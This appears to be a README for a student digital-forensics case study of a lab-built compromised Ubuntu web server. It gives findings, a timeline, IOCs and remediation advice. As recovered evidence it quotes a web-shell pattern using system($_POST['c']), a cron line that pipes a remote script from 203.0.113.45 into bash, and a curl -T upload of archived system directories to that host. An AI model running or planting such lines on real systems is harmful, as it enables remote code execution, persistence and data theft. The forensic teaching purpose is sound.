# AZ-SRV-01 — Compromised Web Server: Disk Forensics Case Study

A complete, reproducible digital-forensics investigation of a compromised Linux web server, performed
end-to-end: evidence acquisition and integrity, filesystem analysis, artifact recovery, timeline
reconstruction, IOC extraction, MITRE ATT&CK mapping, and an incident report with remediation.

> **Scope note (read first):** the disk image `AZ-SRV-01.img` is a **lab-generated** evidence image built
> from a documented scenario (see `lab/build_evidence.py`). It is not a real victim machine and no
> production data is included. Everything in the analysis below was genuinely extracted from that image
> using The Sleuth Kit — the hashes, inode numbers, timestamps and recovered files are real outputs, not
> illustrative examples.

---

## 1. Case summary

| Item | Detail |
|---|---|
| Host | `AZ-SRV-01` — Ubuntu 22.04 web server (fictional AZ Trading Co.) |
| Evidence | 128 MB ext4 disk image, acquired as a bit-for-bit copy |
| Acquisition hash | `md5 ab915de4cb82737611db791c5f71fd4e` / `sha256 b52fa66c597f431a96c2819ca1885e696c51ce05a9486c73df6d4483e2a27b68` |
| Investigation window | 10–11 Feb 2026 |
| Initial access | Uploaded PHP web shell in `/var/www/html/uploads/` |
| Impact | Persistence, rogue account, credential and data staging; outbound transfer attempted |
| Verdict | Confirmed compromise; attacker held interactive shell as `deploy`, then root |

## 2. Methodology

1. **Acquisition & integrity** — image hashed before analysis (`hashes.txt`); every recovered artifact is
   re-hashed in `evidence/HASHES.txt` so findings can be verified independently.
2. **Filesystem survey** — `fsstat` for volume metadata, `fls -r` for the full inode tree.
3. **Timeline** — `fls -m` body file → `mactime` MACB timeline (`analysis/04_timeline.csv`).
4. **Artifact recovery** — `icat` by inode, no mounting of the image (read-only workflow).
5. **Analysis** — correlate web logs, auth logs, shell history and persistence locations.
6. **Reporting** — findings with evidence, ATT&CK mapping, IOCs, and remediation.

## 3. Findings

### F1 — Web shell uploaded to a writable upload directory (Critical)
An obfuscated PHP web shell was written to `/var/www/html/uploads/.cache.php` (inode 45, 74 bytes),
disguised as a cache helper, executing arbitrary commands via `system($_POST['c'])`.

```
GET  /uploads/            11/Feb 02:13:58   ← directory enumeration
POST /uploads/.cache.php  11/Feb 02:14:41   ← first command execution
```
**ATT&CK:** T1505.003 (Server Software Component: Web Shell) · **CWE-434** (Unrestricted Upload)

### F2 — SSH access with an attacker-controlled key (High)
`/home/deploy/.ssh/authorized_keys` (inode 21) contains an unauthorized `ssh-ed25519` key added at
02:24:05, four minutes after the shell was first used. `auth.log` records a successful publickey login
from `203.0.113.45` at 02:22:11.
**ATT&CK:** T1098.004 (Account Manipulation: SSH Authorized Keys)

### F3 — Privilege escalation to root (High)
`sudo` was used at 02:31:44 and `/etc/sudoers.d/deploy` (inode 16) grants `NOPASSWD:ALL` — created at
02:31:50, seconds after the sudo session opened.
**ATT&CK:** T1548.003 (Abuse Elevation Control: Sudo and Sudo Caching)

### F4 — Rogue local account (High)
`/etc/passwd` shows a new UID 1002 account `svc-update` created at 02:33:02, immediately after root was
obtained; `.bash_history` records the password being set with `chpasswd`.
**ATT&CK:** T1136.001 (Create Account: Local Account)

### F5 — Persistence via www-data cron (Medium)
`/var/spool/cron/crontabs/www-data` (inode 40) fetches and executes a remote script every 7 minutes:

```
*/7 * * * * curl -s http://203.0.113.45/b | bash
```
**ATT&CK:** T1053.003 (Scheduled Task/Job: Cron)

### F6 — Data staging and attempted exfiltration (High)
`/tmp/.staging/` contains a staging note (02:43:57); shell history shows `/etc`, `/home` and `/var/www`
archived with `tar` and uploaded with `curl -T` to `http://203.0.113.45/u`, then deleted.
**ATT&CK:** T1560.001 (Archive Collected Data) · T1048 (Exfiltration Over Alternative Protocol)

### F7 — Credentials handled in clear text (Medium)
The deploy password was set inline (`echo '…' | chpasswd`) and remains in `.bash_history` (inode 19).
**ATT&CK:** T1552.003 (Unsecured Credentials: Shell History)

## 4. Timeline (UTC)

| Time | Event | Evidence |
|---|---|---|
| 11 Feb 02:13:58 | Directory enumeration of `/uploads/` | access.log |
| 02:14:37 | Web shell written | inode 45 mtime |
| 02:14:41 | First command execution | access.log POST |
| 02:22:11 | SSH login as `deploy` from 203.0.113.45 | auth.log |
| 02:24:05 | Attacker SSH key added | inode 21 mtime |
| 02:31:44 | `sudo bash` | auth.log |
| 02:31:50 | `sudoers.d/deploy` NOPASSWD written | inode 16 mtime |
| 02:33:02 | `svc-update` account created | /etc/passwd, auth.log |
| 02:36:20 | Cron persistence installed | inode 40 mtime |
| 02:43:30 | Data staged in `/tmp/.staging` | archive mtime |
| 02:44:09 | Archive uploaded and deleted | .bash_history |

Full machine timeline: `analysis/04_timeline.csv` — 47 MACB rows covering every artifact in the image.

## 5. Indicators of Compromise

See `iocs.csv`. Key indicators:

- `203.0.113.45` — scanning, shell interaction, SSH source, exfil destination
- `/var/www/html/uploads/.cache.php` — web shell
- `crontab` entry fetching `http://203.0.113.45/b`
- Unauthorized key in `/home/deploy/.ssh/authorized_keys`
- Local account `svc-update` (UID 1002)
- `http://203.0.113.45/u` — upload endpoint (exfiltration)

## 6. Recommendations

1. Disable PHP execution in upload directories; validate file type server-side and store uploads outside
   the web root.
2. Enforce key-based SSH with `AllowUsers`/`Match` restrictions; alert on `authorized_keys` changes (auditd).
3. Remove `NOPASSWD` sudoers entries; require MFA for privileged access and log `sudo` to a central SIEM.
4. Ship auth/cron/web logs to a central collector with alerting on new local accounts and cron writes.
5. Rotate every credential on the host; treat the deploy key and `svc-update` password as compromised.
6. Restrict egress from web servers; alert on large outbound transfers and `curl -T`.

## 7. Reproduce it

```bash
pip install -r requirements.txt        # nothing exotic; the analysis uses apt packages
apt-get install -y sleuthkit e2fsprogs # fls, icat, mactime, mkfs.ext4
python3 lab/build_evidence.py          # rebuilds AZ-SRV-01.img (128 MB)
bash analysis/run_analysis.sh          # regenerates every output in analysis/ and evidence/
```

The image itself is **not committed** (see `.gitignore`) — it is rebuilt deterministically by the script,
which is better practice for reproducible research than shipping a 128 MB binary.

## 8. Repository layout

```
lab/build_evidence.py        evidence generator (the scenario)
analysis/run_analysis.sh     full analysis pipeline (Sleuth Kit)
analysis/0*.txt|csv          raw tool output (fsstat, fls, body file, MACB timeline)
evidence/*.recovered         artifacts carved out by inode + HASHES.txt
docs/incident_report.md      standalone report (same content, report format)
iocs.csv                     indicators of compromise
hashes.txt                   image hashes (chain of custody)
```

---

**Author:** Azzam Abdulkarim Alharbi — cybersecurity graduate (B.Sc., 2026), Qassim, Saudi Arabia.
